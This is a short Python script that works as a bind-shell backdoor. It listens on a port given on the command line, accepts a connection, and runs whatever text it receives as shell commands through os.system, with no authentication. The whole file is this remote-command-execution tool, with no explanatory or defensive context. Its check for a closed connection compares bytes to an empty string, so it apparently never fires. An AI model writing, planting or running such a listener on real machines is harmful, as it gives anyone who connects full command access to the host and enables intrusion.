import socket
import os
import sys

portno=sys.argv[1]

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((socket.gethostname(), int(portno)))
sock.listen(5)
connection, address = sock.accept()


while True:
    data=connection.recv(1024)
    if data == "":
        print("connection closed")
        break
    os.system(data[2:])
